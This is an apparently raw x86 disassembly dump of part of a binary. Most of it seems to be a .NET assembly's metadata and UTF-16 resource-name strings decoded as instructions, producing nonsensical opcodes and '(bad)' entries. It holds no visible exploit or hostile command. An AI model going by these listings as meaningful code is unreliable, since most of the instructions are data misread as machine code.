  4049a9:	ins    DWORD PTR es:[edi],dx
  4049aa:	cs inc ebx
  4049ac:	outs   dx,DWORD PTR ds:[esi]
  4049ad:	ins    DWORD PTR es:[edi],dx
  4049ae:	jo     0x404a1f
  4049b0:	outs   dx,BYTE PTR ds:[esi]
  4049b1:	outs   dx,BYTE PTR gs:[esi]
  4049b3:	je     0x404a02
  4049b5:	outs   dx,DWORD PTR ds:[esi]
  4049b6:	fs gs ins BYTE PTR es:[edi],dx
  4049b9:	add    BYTE PTR [ebp+0x64],al
  4049bc:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4049c4:	jae    0x404a27
  4049c6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4049ca:	je     0x404a40
  4049cc:	jb     0x404a37
  4049ce:	bound  esi,QWORD PTR [ebp+0x74]
  4049d1:	add    BYTE PTR gs:[ebp+0x64],al
  4049d5:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4049dd:	jae    0x404a40
  4049df:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  4049e3:	je     0x404a46
  4049e5:	je     0x404a4c
  4049e7:	add    BYTE PTR [ebp+0x69],cl
  4049ea:	arpl   WORD PTR [edx+0x6f],si
  4049ed:	jae    0x404a5e
  4049ef:	data16 je 0x404a20
  4049f2:	push   esi
  4049f3:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4049fa:	jne    0x404a60
  4049fc:	imul   ebp,DWORD PTR [edi+0x2e],0x676f7250
  404a03:	jb     0x404a6a
  404a05:	jae    0x404a7a
  404a07:	imul   ebp,DWORD PTR [edi+0x6e],0x7365522e
  404a0e:	outs   dx,DWORD PTR ds:[esi]
  404a0f:	jne    0x404a83
  404a11:	arpl   WORD PTR [ebp+0x73],sp
  404a14:	cs jb  0x404a7c
  404a17:	jae    0x404a88
  404a19:	jne    0x404a8d
  404a1b:	arpl   WORD PTR [ebp+0x73],sp
  404a1e:	add    BYTE PTR [eax],al
  404a20:	add    BYTE PTR [ebx],al
  404a22:	sub    eax,0x47210100
  404a27:	add    BYTE PTR [eax],dh
  404a29:	add    BYTE PTR [eax],dh
  404a2b:	add    BYTE PTR [eax],dh
  404a2d:	add    BYTE PTR [ecx],dh
  404a2f:	add    BYTE PTR [edx],bh
  404a31:	add    BYTE PTR [eax],ah
  404a33:	add    BYTE PTR [ebx+0x0],bh
  404a36:	xor    BYTE PTR [eax],al
  404a38:	jge    0x404a3a
  404a3a:	and    BYTE PTR [eax],al
  404a3c:	cmp    al,BYTE PTR [eax]
  404a3e:	and    BYTE PTR [eax],al
  404a40:	jnp    0x404a42
  404a42:	xor    DWORD PTR [eax],eax
  404a44:	jge    0x404a46
  404a46:	add    BYTE PTR [ecx+0x4d],bl
  404a49:	add    BYTE PTR [ecx+0x0],ch
  404a4c:	arpl   WORD PTR [eax],ax
  404a4e:	jb     0x404a50
  404a50:	outs   dx,DWORD PTR ds:[esi]
  404a51:	add    BYTE PTR [ebx+0x0],dh
  404a54:	outs   dx,DWORD PTR ds:[esi]
  404a55:	add    BYTE PTR [esi+0x0],ah
  404a58:	je     0x404a5a
  404a5a:	add    BYTE PTR cs:[esi+0x0],dl
  404a5e:	imul   eax,DWORD PTR [eax],0x750073
  404a64:	popa   
  404a65:	add    BYTE PTR [eax+eax*1+0x53],ch
  404a69:	add    BYTE PTR [eax+eax*1+0x75],dh
  404a6d:	add    BYTE PTR [eax+eax*1+0x69],ah
  404a71:	add    BYTE PTR [edi+0x0],ch
  404a74:	add    BYTE PTR cs:[eax+0x0],dl
  404a78:	jb     0x404a7a
  404a7a:	outs   dx,DWORD PTR ds:[esi]
  404a7b:	add    BYTE PTR [edi+0x0],ah
  404a7e:	jb     0x404a80
  404a80:	add    BYTE PTR gs:[ebx+0x0],dh
  404a84:	jae    0x404a86
  404a86:	imul   eax,DWORD PTR [eax],0x6e006f
  404a8c:	add    BYTE PTR cs:[edx+0x0],dl
  404a90:	add    BYTE PTR gs:[ebx+0x0],dh
  404a94:	outs   dx,DWORD PTR ds:[esi]
  404a95:	add    BYTE PTR [ebp+0x0],dh
  404a98:	jb     0x404a9a
  404a9a:	arpl   WORD PTR [eax],ax
  404a9c:	add    BYTE PTR gs:[ebx+0x0],dh
  404aa0:	add    BYTE PTR [ecx],dh
  404aa2:	inc    ebp
  404aa3:	add    BYTE PTR [edx+0x0],dh
  404aa6:	jb     0x404aa8
  404aa8:	outs   dx,DWORD PTR ds:[esi]
  404aa9:	add    BYTE PTR [edx+0x0],dh
  404aac:	pop    edi
  404aad:	add    BYTE PTR [ecx+0x0],cl
  404ab0:	outs   dx,BYTE PTR ds:[esi]
  404ab1:	add    BYTE PTR [esi+0x0],dh
  404ab4:	popa   
  404ab5:	add    BYTE PTR [eax+eax*1+0x69],ch
  404ab9:	add    BYTE PTR [eax+eax*1+0x43],ah
  404abd:	add    BYTE PTR [ebp+0x0],dh
  404ac0:	ins    BYTE PTR es:[edi],dx
  404ac1:	add    BYTE PTR [eax+eax*1+0x75],dh
  404ac5:	add    BYTE PTR [edx+0x0],dh
  404ac8:	add    BYTE PTR gs:[esi+0x0],cl
  404acc:	popa   
  404acd:	add    BYTE PTR [ebp+0x0],ch
  404ad0:	add    BYTE PTR gs:[eax],al
  404ad3:	sub    eax,DWORD PTR [ebp+0x0]
  404ad6:	jb     0x404ad8
  404ad8:	jb     0x404ada
  404ada:	outs   dx,DWORD PTR ds:[esi]
  404adb:	add    BYTE PTR [edx+0x0],dh
  404ade:	pop    edi
  404adf:	add    BYTE PTR [ebp+0x0],cl
  404ae2:	imul   eax,DWORD PTR [eax],0x730073
  404ae8:	imul   eax,DWORD PTR [eax],0x67006e
  404aee:	inc    ecx
  404aef:	add    BYTE PTR [edx+0x0],dh
  404af2:	add    BYTE PTR [di+0x0],dh
  404af6:	ins    DWORD PTR es:[edi],dx
  404af7:	add    BYTE PTR [ebp+0x0],ah
  404afa:	outs   dx,BYTE PTR ds:[esi]
  404afb:	add    BYTE PTR [eax+eax*1+0x0],dh
  404aff:	xor    DWORD PTR [ebp+0x0],eax
  404b02:	jb     0x404b04
  404b04:	jb     0x404b06
  404b06:	outs   dx,DWORD PTR ds:[esi]
  404b07:	add    BYTE PTR [edx+0x0],dh
  404b0a:	pop    edi
  404b0b:	add    BYTE PTR [ebp+0x0],cl
  404b0e:	imul   eax,DWORD PTR [eax],0x730073
  404b14:	imul   eax,DWORD PTR [eax],0x67006e
  404b1a:	dec    ebx
  404b1b:	add    BYTE PTR [ebp+0x0],ah
  404b1e:	jns    0x404b20
  404b20:	inc    ecx
  404b21:	add    BYTE PTR [edx+0x0],dh
  404b24:	add    BYTE PTR [di+0x0],dh
  404b28:	ins    DWORD PTR es:[edi],dx
  404b29:	add    BYTE PTR [ebp+0x0],ah
  404b2c:	outs   dx,BYTE PTR ds:[esi]
  404b2d:	add    BYTE PTR [eax+eax*1+0x0],dh
  404b31:	and    eax,0x720045
  404b36:	jb     0x404b38
  404b38:	outs   dx,DWORD PTR ds:[esi]
  404b39:	add    BYTE PTR [edx+0x0],dh
  404b3c:	pop    edi
  404b3d:	add    BYTE PTR [esi+0x0],cl
  404b40:	jne    0x404b42
  404b42:	ins    BYTE PTR es:[edi],dx
  404b43:	add    BYTE PTR [eax+eax*1+0x41],ch
  404b47:	add    BYTE PTR [edx+0x0],dh
  404b4a:	add    BYTE PTR [di+0x0],dh
  404b4e:	ins    DWORD PTR es:[edi],dx
  404b4f:	add    BYTE PTR [ebp+0x0],ah
  404b52:	outs   dx,BYTE PTR ds:[esi]
  404b53:	add    BYTE PTR [eax+eax*1+0x0],dh
  404b57:	xor    eax,DWORD PTR [ebp+0x0]
  404b5a:	jb     0x404b5c
  404b5c:	jb     0x404b5e
  404b5e:	outs   dx,DWORD PTR ds:[esi]
  404b5f:	add    BYTE PTR [edx+0x0],dh
  404b62:	pop    edi
  404b63:	add    BYTE PTR [esi+0x0],cl
  404b66:	jne    0x404b68
  404b68:	ins    BYTE PTR es:[edi],dx
  404b69:	add    BYTE PTR [eax+eax*1+0x4f],ch
  404b6d:	add    BYTE PTR [edx+0x0],dh
  404b70:	inc    ebp
  404b71:	add    BYTE PTR [ebp+0x0],ch
  404b74:	jo     0x404b76
  404b76:	je     0x404b78
  404b78:	jns    0x404b7a
  404b7a:	inc    ecx
  404b7b:	add    BYTE PTR [edx+0x0],dh
  404b7e:	add    BYTE PTR [di+0x0],dh
  404b82:	ins    DWORD PTR es:[edi],dx
  404b83:	add    BYTE PTR [ebp+0x0],ah
  404b86:	outs   dx,BYTE PTR ds:[esi]
  404b87:	add    BYTE PTR [eax+eax*1+0x0],dh
  404b8b:	cmp    DWORD PTR [ebp+0x0],eax
  404b8e:	jb     0x404b90
  404b90:	jb     0x404b92
  404b92:	outs   dx,DWORD PTR ds:[esi]
  404b93:	add    BYTE PTR [edx+0x0],dh
  404b96:	pop    edi
  404b97:	add    BYTE PTR [esi+0x0],cl
  404b9a:	jne    0x404b9c
  404b9c:	ins    BYTE PTR es:[edi],dx
  404b9d:	add    BYTE PTR [eax+eax*1+0x4f],ch
  404ba1:	add    BYTE PTR [edx+0x0],dh
  404ba4:	inc    ebp
  404ba5:	add    BYTE PTR [ebp+0x0],ch
  404ba8:	jo     0x404baa
  404baa:	je     0x404bac
  404bac:	jns    0x404bae
  404bae:	dec    ebx
  404baf:	add    BYTE PTR [ebp+0x0],ah
  404bb2:	jns    0x404bb4
  404bb4:	inc    ecx
  404bb5:	add    BYTE PTR [edx+0x0],dh
  404bb8:	add    BYTE PTR [di+0x0],dh
  404bbc:	ins    DWORD PTR es:[edi],dx
  404bbd:	add    BYTE PTR [ebp+0x0],ah
  404bc0:	outs   dx,BYTE PTR ds:[esi]
  404bc1:	add    BYTE PTR [eax+eax*1+0x0],dh
  404bc5:	cmp    eax,0x720045
  404bca:	jb     0x404bcc
  404bcc:	outs   dx,DWORD PTR ds:[esi]
  404bcd:	add    BYTE PTR [edx+0x0],dh
  404bd0:	pop    edi
  404bd1:	add    BYTE PTR [esi+0x0],cl
  404bd4:	jne    0x404bd6
  404bd6:	ins    BYTE PTR es:[edi],dx
  404bd7:	add    BYTE PTR [eax+eax*1+0x4f],ch
  404bdb:	add    BYTE PTR [edx+0x0],dh
  404bde:	inc    ebp
  404bdf:	add    BYTE PTR [ebp+0x0],ch
  404be2:	jo     0x404be4
  404be4:	je     0x404be6
  404be6:	jns    0x404be8
  404be8:	push   esi
  404be9:	add    BYTE PTR [ecx+0x0],ah
  404bec:	ins    BYTE PTR es:[edi],dx
  404bed:	add    BYTE PTR [ebp+0x0],dh
  404bf0:	add    BYTE PTR gs:[ecx+0x0],al
  404bf4:	jb     0x404bf6
  404bf6:	add    BYTE PTR [di+0x0],dh
  404bfa:	ins    DWORD PTR es:[edi],dx
  404bfb:	add    BYTE PTR [ebp+0x0],ah
  404bfe:	outs   dx,BYTE PTR ds:[esi]
  404bff:	add    BYTE PTR [eax+eax*1+0x0],dh
  404c03:	xor    eax,0x720045
  404c08:	jb     0x404c0a
  404c0a:	outs   dx,DWORD PTR ds:[esi]
  404c0b:	add    BYTE PTR [edx+0x0],dh
  404c0e:	pop    edi
  404c0f:	add    BYTE PTR [ebp+0x0],dl
  404c12:	outs   dx,BYTE PTR ds:[esi]
  404c13:	add    BYTE PTR [edx+0x0],dh
  404c16:	add    BYTE PTR gs:[ebx+0x0],ah
  404c1a:	outs   dx,DWORD PTR ds:[esi]
  404c1b:	add    BYTE PTR [edi+0x0],ah
  404c1e:	outs   dx,BYTE PTR ds:[esi]
  404c1f:	add    BYTE PTR [ecx+0x0],ch
  404c22:	jp     0x404c24
  404c24:	add    BYTE PTR gs:[eax+eax*1+0x41],ah
  404c29:	add    BYTE PTR [edx+0x0],dh
  404c2c:	add    BYTE PTR [di+0x0],dh
  404c30:	ins    DWORD PTR es:[edi],dx
  404c31:	add    BYTE PTR [ebp+0x0],ah
  404c34:	outs   dx,BYTE PTR ds:[esi]
  404c35:	add    BYTE PTR [eax+eax*1+0x0],dh
  404c39:	cmp    eax,0x720045
  404c3e:	jb     0x404c40
  404c40:	outs   dx,DWORD PTR ds:[esi]
  404c41:	add    BYTE PTR [edx+0x0],dh
  404c44:	pop    edi
  404c45:	add    BYTE PTR [ebp+0x0],dl
  404c48:	outs   dx,BYTE PTR ds:[esi]
  404c49:	add    BYTE PTR [edx+0x0],dh
  404c4c:	add    BYTE PTR gs:[ebx+0x0],ah
  404c50:	outs   dx,DWORD PTR ds:[esi]
  404c51:	add    BYTE PTR [edi+0x0],ah
  404c54:	outs   dx,BYTE PTR ds:[esi]
  404c55:	add    BYTE PTR [ecx+0x0],ch
  404c58:	jp     0x404c5a
  404c5a:	add    BYTE PTR gs:[eax+eax*1+0x4f],ah
  404c5f:	add    BYTE PTR [ebp+0x0],dh
  404c62:	je     0x404c64
  404c64:	jo     0x404c66
  404c66:	jne    0x404c68
  404c68:	je     0x404c6a
  404c6a:	inc    esi
  404c6b:	add    BYTE PTR [edi+0x0],ch
  404c6e:	jb     0x404c70
  404c70:	ins    DWORD PTR es:[edi],dx
  404c71:	add    BYTE PTR [ecx+0x0],ah
  404c74:	je     0x404c76
  404c76:	add    BYTE PTR [ebx],ah
  404c78:	push   ebx
  404c79:	add    BYTE PTR [edi+0x0],dh
  404c7c:	imul   eax,DWORD PTR [eax],0x630074
  404c82:	push   0x41005f00
  404c87:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404c8b:	add    BYTE PTR [edi+0x0],bl
  404c8e:	dec    esi
  404c8f:	add    BYTE PTR [edi+0x0],cl
  404c92:	dec    esp
  404c93:	add    BYTE PTR [edi+0x0],cl
  404c96:	inc    ebx
  404c97:	add    BYTE PTR [edi+0x0],bl
  404c9a:	add    BYTE PTR [ecx],dh
  404c9c:	push   ebx
  404c9d:	add    BYTE PTR [edi+0x0],dh
  404ca0:	imul   eax,DWORD PTR [eax],0x630074
  404ca6:	push   0x45005f00
  404cab:	add    BYTE PTR [eax+0x0],bh
  404cae:	arpl   WORD PTR [eax],ax
  404cb0:	add    BYTE PTR gs:[eax+0x0],dh
  404cb4:	je     0x404cb6
  404cb6:	imul   eax,DWORD PTR [eax],0x6e006f
  404cbc:	jae    0x404cbe
  404cbe:	pop    edi
  404cbf:	add    BYTE PTR [esi+0x0],cl
  404cc2:	dec    edi
  404cc3:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404cc7:	add    BYTE PTR [ebx+0x0],al
  404cca:	pop    edi
  404ccb:	add    BYTE PTR [eax],al
  404ccd:	and    eax,0x770053
  404cd2:	imul   eax,DWORD PTR [eax],0x630074
  404cd8:	push   0x48005f00
  404cdd:	add    BYTE PTR [ebp+0x0],ah
  404ce0:	ins    BYTE PTR es:[edi],dx
  404ce1:	add    BYTE PTR [eax+0x0],dh
  404ce4:	pop    edi
  404ce5:	add    BYTE PTR [esi+0x0],cl
  404ce8:	dec    edi
  404ce9:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404ced:	add    BYTE PTR [ebx+0x0],al
  404cf0:	pop    edi
  404cf1:	add    BYTE PTR [eax],al
  404cf3:	daa    
  404cf4:	push   ebx
  404cf5:	add    BYTE PTR [edi+0x0],dh
  404cf8:	imul   eax,DWORD PTR [eax],0x630074
  404cfe:	push   0x49005f00
  404d03:	add    BYTE PTR [esi+0x0],ch
  404d06:	jo     0x404d08
  404d08:	jne    0x404d0a
  404d0a:	je     0x404d0c
  404d0c:	pop    edi
  404d0d:	add    BYTE PTR [esi+0x0],cl
  404d10:	dec    edi
  404d11:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404d15:	add    BYTE PTR [ebx+0x0],al
  404d18:	pop    edi
  404d19:	add    BYTE PTR [eax],al
  404d1b:	sub    DWORD PTR [ebx+0x0],edx
  404d1e:	ja     0x404d20
  404d20:	imul   eax,DWORD PTR [eax],0x630074
  404d26:	push   0x4f005f00
  404d2b:	add    BYTE PTR [ebp+0x0],dh
  404d2e:	je     0x404d30
  404d30:	jo     0x404d32
  404d32:	jne    0x404d34
  404d34:	je     0x404d36
  404d36:	pop    edi
  404d37:	add    BYTE PTR [esi+0x0],cl
  404d3a:	dec    edi
  404d3b:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404d3f:	add    BYTE PTR [ebx+0x0],al
  404d42:	pop    edi
  404d43:	add    BYTE PTR [eax],al
  404d45:	xor    eax,0x770053
  404d4a:	imul   eax,DWORD PTR [eax],0x630074
  404d50:	push   0x4f005f00
  404d55:	add    BYTE PTR [ebp+0x0],dh
  404d58:	je     0x404d5a
  404d5a:	jo     0x404d5c
  404d5c:	jne    0x404d5e
  404d5e:	je     0x404d60
  404d60:	inc    esi
  404d61:	add    BYTE PTR [edi+0x0],ch
  404d64:	jb     0x404d66
  404d66:	ins    DWORD PTR es:[edi],dx
  404d67:	add    BYTE PTR [ecx+0x0],ah
  404d6a:	je     0x404d6c
  404d6c:	pop    edi
  404d6d:	add    BYTE PTR [esi+0x0],cl
  404d70:	dec    edi
  404d71:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404d75:	add    BYTE PTR [ebx+0x0],al
  404d78:	pop    edi
  404d79:	add    BYTE PTR [eax],al
  404d7b:	and    eax,0x770053
  404d80:	imul   eax,DWORD PTR [eax],0x630074
  404d86:	push   0x50005f00
  404d8b:	add    BYTE PTR [ecx+0x0],ah
  404d8e:	je     0x404d90
  404d90:	push   0x4e005f00
  404d95:	add    BYTE PTR [edi+0x0],cl
  404d98:	dec    esp
  404d99:	add    BYTE PTR [edi+0x0],cl
  404d9c:	inc    ebx
  404d9d:	add    BYTE PTR [edi+0x0],bl
  404da0:	add    BYTE PTR [edi],ch
  404da2:	push   ebx
  404da3:	add    BYTE PTR [edi+0x0],dh
  404da6:	imul   eax,DWORD PTR [eax],0x630074
  404dac:	push   0x51005f00
  404db1:	add    BYTE PTR [ebp+0x0],dh
  404db4:	add    BYTE PTR gs:[edx+0x0],dh
  404db8:	jns    0x404dba
  404dba:	inc    esi
  404dbb:	add    BYTE PTR [ecx+0x0],ch
  404dbe:	ins    BYTE PTR es:[edi],dx
  404dbf:	add    BYTE PTR [ebp+0x0],ah
  404dc2:	pop    edi
  404dc3:	add    BYTE PTR [esi+0x0],cl
  404dc6:	dec    edi
  404dc7:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404dcb:	add    BYTE PTR [ebx+0x0],al
  404dce:	pop    edi
  404dcf:	add    BYTE PTR [eax],al
  404dd1:	xor    edx,DWORD PTR [ebx+0x0]
  404dd4:	ja     0x404dd6
  404dd6:	imul   eax,DWORD PTR [eax],0x630074
  404ddc:	push   0x51005f00
  404de1:	add    BYTE PTR [ebp+0x0],dh
  404de4:	add    BYTE PTR gs:[edx+0x0],dh
  404de8:	jns    0x404dea
  404dea:	push   ebx
  404deb:	add    BYTE PTR [eax+eax*1+0x72],dh
  404def:	add    BYTE PTR [ecx+0x0],ch
  404df2:	outs   dx,BYTE PTR ds:[esi]
  404df3:	add    BYTE PTR [edi+0x0],ah
  404df6:	pop    edi
  404df7:	add    BYTE PTR [esi+0x0],cl
  404dfa:	dec    edi
  404dfb:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404dff:	add    BYTE PTR [ebx+0x0],al
  404e02:	pop    edi
  404e03:	add    BYTE PTR [eax],al
  404e05:	sub    eax,0x770053
  404e0a:	imul   eax,DWORD PTR [eax],0x630074
  404e10:	push   0x51005f00
  404e15:	add    BYTE PTR [ebp+0x0],dh
  404e18:	add    BYTE PTR gs:[ebx+0x0],dh
  404e1c:	je     0x404e1e
  404e1e:	imul   eax,DWORD PTR [eax],0x6e006f
  404e24:	pop    edi
  404e25:	add    BYTE PTR [esi+0x0],cl
  404e28:	dec    edi
  404e29:	add    BYTE PTR [eax+eax*1+0x4f],cl
  404e2d:	add    BYTE PTR [ebx+0x0],al
  404e30:	pop    edi
  404e31:	add    BYTE PTR [eax],al
  404e33:	das    
  404e34:	push   ebx
  404e35:	add    BYTE PTR [edi+0x0],dh
  404e38:	imul   eax,DWORD PTR [eax],0x630074
  404e3e:	push   0x55005f00
  404e43:	add    BYTE PTR [ecx+0x0],cl
  404e46:	inc    ebx
  404e47:	add    BYTE PTR [ebp+0x0],dh
  404e4a:	ins    BYTE PTR es:[edi],dx
  404e4b:	add    BYTE PTR [eax+eax*1+0x75],dh
  404e4f:	add    BYTE PTR [edx+0x0],dh
  404e52:	add    BYTE PTR gs:[edi+0x0],bl
  404e56:	dec    esi
  404e57:	add    BYTE PTR [edi+0x0],cl
  404e5a:	dec    esp
  404e5b:	add    BYTE PTR [edi+0x0],cl
  404e5e:	inc    ebx
  404e5f:	add    BYTE PTR [edi+0x0],bl
  404e62:	add    BYTE PTR ds:0x790053,cl
  404e68:	outs   dx,BYTE PTR ds:[esi]
  404e69:	add    BYTE PTR [eax+eax*1+0x61],dh
  404e6d:	add    BYTE PTR [eax+0x0],bh
  404e70:	add    BYTE PTR [eax],al
  404e72:	add    BYTE PTR [eax],al
  404e74:	inc    edx
  404e75:	lea    esi,[edx-0x5b7c6c81]
  404e7b:	inc    esi
  404e7c:	xor    DWORD PTR [esi+edx*2],0xffffffe1
  404e80:	mov    eax,0xd1e3d
  404e85:	or     BYTE PTR [edi+0x19565c7a],dh
  404e8b:	xor    al,0xe0
  404e8d:	mov    DWORD PTR ds:0x1d010100,eax
  404e93:	push   cs
  404e94:	add    esp,DWORD PTR [eax]
  404e96:	add    BYTE PTR [ecx],al
  404e98:	or     BYTE PTR [eax+0x117f5f3f],dh
  404e9e:	aad    0xa
  404ea0:	cmp    al,BYTE PTR [ebx]
  404ea2:	push   es
  404ea3:	adc    cl,BYTE PTR ds:0x12002004
  404ea9:	or     eax,0x1012005
  404eae:	adc    cl,BYTE PTR ds:0x8012005
  404eb4:	sbb    eax,0x100050e
  404eb9:	add    DWORD PTR [ecx],edx
  404ebb:	adc    BYTE PTR [ebx],al
  404ebd:	add    BYTE PTR [eax],al
  404ebf:	add    DWORD PTR [edx],ecx
  404ec1:	and    BYTE PTR [edx+eax*1],al
  404ec4:	adc    DWORD PTR [eax],edx
  404ec6:	adc    BYTE PTR [eax],cl
  404ec8:	sbb    eax,0x20040e0e
  404ecd:	add    DWORD PTR [ecx],eax
  404ecf:	push   cs
  404ed0:	push   es
  404ed1:	and    BYTE PTR [edx],al
  404ed3:	add    dl,BYTE PTR [ecx]
  404ed5:	adc    BYTE PTR [esi],cl
  404ed7:	add    eax,0x11110120
  404edc:	push   cs
  404edd:	add    eax,0xe010200
  404ee2:	push   cs
  404ee3:	add    al,0x28
  404ee5:	add    BYTE PTR [edx],dl
  404ee7:	or     eax,0x3080602
  404eec:	push   es
  404eed:	adc    DWORD PTR [eax],edx
  404eef:	add    al,0x0
  404ef1:	add    BYTE PTR [eax],al
  404ef3:	add    BYTE PTR [ecx+eax*1],al
  404ef6:	add    BYTE PTR [eax],al
  404ef8:	add    BYTE PTR [edx+eax*1],al
  404efb:	add    BYTE PTR [eax],al
  404efd:	add    BYTE PTR [ebx+eax*1],al
  404f00:	add    BYTE PTR [eax],al
  404f02:	add    BYTE PTR [esp+eax*1],al
  404f05:	add    BYTE PTR [eax],al
  404f07:	add    BYTE PTR [eax*1+0x4000000],al
  404f0e:	push   es
  404f0f:	add    BYTE PTR [eax],al
  404f11:	add    BYTE PTR [edi+eax*1],al
  404f14:	add    BYTE PTR [eax],al
  404f16:	add    BYTE PTR [eax+ecx*1],al
  404f19:	add    BYTE PTR [eax],al
  404f1b:	add    BYTE PTR [ecx+ecx*1],al
  404f1e:	add    BYTE PTR [eax],al
  404f20:	add    BYTE PTR [edx+ecx*1],al
  404f23:	add    BYTE PTR [eax],al
  404f25:	add    BYTE PTR [ebx],al
  404f27:	push   es
  404f28:	adc    dl,BYTE PTR ds:0x19120603
  404f2e:	add    al,0x0
  404f30:	add    BYTE PTR [edx],dl
  404f32:	adc    eax,0x12000004
  404f37:	sbb    DWORD PTR ds:0x12010100,eax
  404f3d:	sbb    DWORD PTR [ebx],eax
  404f3f:	add    BYTE PTR [eax],al
  404f41:	push   cs
  404f42:	add    al,0x8
  404f44:	add    BYTE PTR [edx],dl
  404f46:	adc    eax,0x12000804
  404f4b:	sbb    DWORD PTR [ebx],eax
  404f4d:	or     BYTE PTR [eax],al
  404f4f:	push   cs
  404f50:	add    al,BYTE PTR [esi]
  404f52:	push   cs
  404f53:	add    al,0x31
  404f55:	add    BYTE PTR [ecx],dh
  404f57:	add    BYTE PTR [edx],al
  404f59:	xor    BYTE PTR [eax],al
  404f5b:	or     BYTE PTR [ecx],dh
  404f5d:	add    BYTE PTR [ecx],dh
  404f5f:	add    BYTE PTR [esi],ch
  404f61:	add    BYTE PTR [eax],dh
  404f63:	add    BYTE PTR [eax+eiz*1],al
  404f66:	add    DWORD PTR [ecx],eax
  404f68:	add    al,BYTE PTR ds:0xe010220
  404f6e:	push   cs
  404f6f:	add    eax,0x11010120
  404f74:	imul   eax,DWORD PTR [eax+eiz*1],0x80080101
  404f7b:	mov    al,ds:0x2400
  404f80:	add    al,0x80
  404f82:	add    BYTE PTR [eax],al
  404f84:	xchg   esp,eax
  404f85:	add    BYTE PTR [eax],al
  404f87:	add    BYTE PTR [esi],al
  404f89:	add    al,BYTE PTR [eax]
  404f8b:	add    BYTE PTR [eax],al
  404f8d:	and    al,0x0
  404f8f:	add    BYTE PTR [edx+0x53],dl
  404f92:	inc    ecx
  404f93:	xor    DWORD PTR [eax],eax
  404f95:	add    al,0x0
  404f97:	add    BYTE PTR [ecx],al
  404f99:	add    BYTE PTR [ecx],al
  404f9b:	add    BYTE PTR [edi],al
  404f9d:	sar    edx,1
  404f9f:	push   edi
  404fa0:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  404fa6:	test   BYTE PTR [edx+0xdfdae0f],ch
  404fac:	jmp    0xecab4d99
  404fb1:	pop    DWORD PTR [edi+0x6c7603fb]
  404fb7:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  404fbc:	mov    dl,0x3b
  404fbe:	out    0x9a,eax
  404fc0:	(bad)  
  404fc2:	fadd   st(1),st
  404fc4:	fstp   QWORD PTR [edx+0x211336d2]
  404fca:	add    dl,BYTE PTR [eax-0x6c38df5]
  404fd0:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  404fd7:	pop    esi
  404fd9:	pop    es
  404fda:	ja     0x40502b
  404fdc:	sub    eax,ebp
  404fde:	xor    cl,BYTE PTR [esi]
  404fe0:	xchg   edx,eax
  404fe1:	jmp    0xc021:0xe8e4ec05
  404fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fe9:	out    dx,eax
  404fea:	call   0x4c9cb4e0
  404fef:	or     al,0x93
  404ff1:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  404ff8:	stos   BYTE PTR es:[edi],al
  404ff9:	gs sub al,0x1d
  404ffc:	cli    
  404ffd:	(bad)  
  404ffe:	cmp    eax,0x2d6f5d74
  405003:	in     eax,0xf1
  405005:	jle    0x405065
  405007:	scas   eax,DWORD PTR es:[edi]
  405008:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  405010:	inc    ebx
  405011:	sbb    BYTE PTR gs:[eax],ah
  405014:	ins    DWORD PTR es:[edi],dx
  405015:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  40501c:	add    al,0x0
  40501e:	add    BYTE PTR [edx],dl
  405020:	jne    0x405027
  405022:	add    BYTE PTR [ecx],al
  405024:	add    DWORD PTR [edx],edx
  405026:	jne    0x40502d
  405028:	add    BYTE PTR [eax],al
  40502a:	adc    al,BYTE PTR [eax+0x200381]
  405030:	push   cs
  405031:	add    al,0x0
  405033:	add    DWORD PTR [ecx],eax
  405035:	or     BYTE PTR [eax],cl
  405037:	pop    es
  405038:	add    ecx,DWORD PTR [eax]
  40503a:	adc    cl,BYTE PTR [edx+edx*1]
  40503d:	add    BYTE PTR [ebp+0x1012006],0x12
  405044:	add    BYTE PTR [ecx+0x8002003],0x4
  40504b:	pop    es
  40504c:	add    cl,BYTE PTR [eax]
  40504e:	or     BYTE PTR [eax+eax*1],al
  405051:	add    DWORD PTR [edx],eax
  405053:	push   cs
  405054:	add    al,0x20
  405056:	add    DWORD PTR [ebx],eax
  405058:	or     BYTE PTR [eax+eiz*1],al
  40505b:	add    DWORD PTR [esi],ecx
  40505d:	or     BYTE PTR ds:0xe0e0200,al
  405063:	push   cs
  405064:	or     BYTE PTR [eax],al
  405066:	add    ecx,DWORD PTR [eax]
  405068:	push   cs
  405069:	push   cs
  40506a:	adc    DWORD PTR [eax+0x6070a91],eax
  405070:	or     BYTE PTR [eax],cl
  405072:	push   cs
  405073:	adc    DWORD PTR [eax],edx
  405075:	push   cs
  405076:	adc    DWORD PTR [eax],edx
  405078:	add    al,0x7
  40507a:	add    DWORD PTR [ecx],edx
  40507c:	adc    BYTE PTR [eax],cl
  40507e:	and    BYTE PTR [eax],al
  405080:	adc    eax,0x1958012
  405085:	push   cs
  405086:	push   es
  405087:	adc    eax,0x1958012
  40508c:	push   cs
  40508d:	add    eax,0x13010120
  405092:	add    BYTE PTR ds:0x11010120,al
  405098:	adc    DWORD PTR ds:0xe010220,eax
  40509e:	add    cl,BYTE PTR [edx]
  4050a0:	and    BYTE PTR [eax],al
  4050a2:	adc    eax,0x1958012
  4050a7:	adc    al,BYTE PTR [eax+0x12150899]
  4050ad:	adc    BYTE PTR [ebp-0x667fedff],0x8
  4050b4:	pop    es
  4050b5:	add    ecx,DWORD PTR [esi]
  4050b7:	adc    al,BYTE PTR [eax+0x5101199]
  4050bd:	and    BYTE PTR [ecx],al
  4050bf:	add    DWORD PTR [edx],edx
